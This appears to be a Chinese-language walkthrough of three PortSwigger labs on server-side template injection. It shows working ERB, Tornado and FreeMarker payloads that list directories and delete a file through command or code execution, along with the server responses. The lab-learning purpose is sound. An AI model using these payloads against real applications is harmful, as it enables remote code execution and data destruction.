---
title: Server-side template injection
description: Server-side template injection
---

## Lab: Basic server-side template injection

| Dimension | Description                                                                                                             |
| --------- | ----------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read                                     |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic |

點選第一個 product，發現導到 `https://0abc00e204db5b45820e83400062000f.web-security-academy.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock`

先合理推測注入點應該是 `?message=` 這邊

Lab 有說要閱讀 [ERB](https://docs.ruby-lang.org/en/3.4/ERB.html) 的官方文件

1. `<%= x %>`

```
(erb):1:in `<main>': undefined local variable or method `x' for main:Object (NameError) from /usr/lib/ruby/2.7.0/erb.rb:905:in `eval' from /usr/lib/ruby/2.7.0/erb.rb:905:in `result' from -e:4:in `<main>'
```

2. `<%= x=42; x %>`

42

3. `<%= x=Dir.children('.'); x %>`

[".bash_logout", ".bashrc", ".profile", "morale.txt", ".bash_history"]

4. `<%= File.delete('morale.txt'); %>`

成功解題

## Lab: Basic server-side template injection (code context)

| Dimension | Description                                                                                                                          |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read                                                  |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context |

"Preferred name" 會去戳這隻 API

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=user.first_name&csrf=7HxFgj0pQGHnI4gYjKGWKmZFq76R0JI9`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

Lab 有說要閱讀 [Tornado](https://www.tornadoweb.org/en/stable/template.html) 的官方文件

1. 修改成 user

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=user&csrf=7HxFgj0pQGHnI4gYjKGWKmZFq76R0JI9`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

&lt;**main**.User instance at 0x7fa2a569f0f0&gt;

2. 修改成 666

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=${encodeURIComponent(`x=666;x`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

3. 嘗試 import os

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=${encodeURIComponent(`import os;os.listdir('.')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

```
No handlers could be found for logger "tornado.application" Traceback (most recent call last): File "<string>", line 15, in <module> File "/usr/local/lib/python2.7/dist-packages/tornado/template.py", line 317, in __init__ "exec", dont_inherit=True) File "<string>.generated.py", line 4 _tt_tmp = import os;os.listdir('.') # <string>:1 ^ SyntaxError: invalid syntax
```

4. AI 說 Tornado 有一套自己的語法

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=${encodeURIComponent(`__import__('os').listdir('.')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

```
[&#39;.bash_logout&#39;, &#39;.bashrc&#39;, &#39;.profile&#39;, &#39;morale.txt&#39;, &#39;.bash_history&#39;]
```

5. 來刪檔案

```js
fetch(
  "https://0a30002003206b27811b34cf0094009f.web-security-academy.net/my-account/change-blog-post-author-display",
  {
    headers: {
      "content-type": "application/x-www-form-urlencoded",
    },
    body: `blog-post-author-display=${encodeURIComponent(`__import__('os').remove('morale.txt')`)}&csrf=4b6VsskRMTRNZ5UzLHHsrdt83ALosBL5`,
    method: "POST",
    mode: "cors",
    credentials: "include",
  },
);
```

## Lab: Server-side template injection using documentation

| Dimension | Description                                                                                                                           |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Document  | https://portswigger.net/web-security/server-side-template-injection/exploiting#read-about-the-security-implications                   |
| Lab       | https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation |

在 https://0a4000cf045179d081c3116c008a001f.web-security-academy.net/product/template?productId=1 有編輯模板的功能

1. 嘗試 `${product}`

`lab.actions.templateengines.FreeMarkerProduct@16e7dcfd`

[FreeMarker 官方文件](https://freemarker.apache.org/index.html)

[Seldom used and expert built-ins](https://freemarker.apache.org/docs/ref_builtins_expert.html)

2. 嘗試 `${"1+2"?eval}`

`3`

3. 嘗試

```
<#assign x="freemarker.template.utility.Execute"?new()>
${x("ls")}
```

morale.txt

4. 嘗試

```
<#assign x="freemarker.template.utility.Execute"?new()>
${x("rm morale.txt")}
```

成功刪除

## 參考資料

- https://portswigger.net/web-security/server-side-template-injection
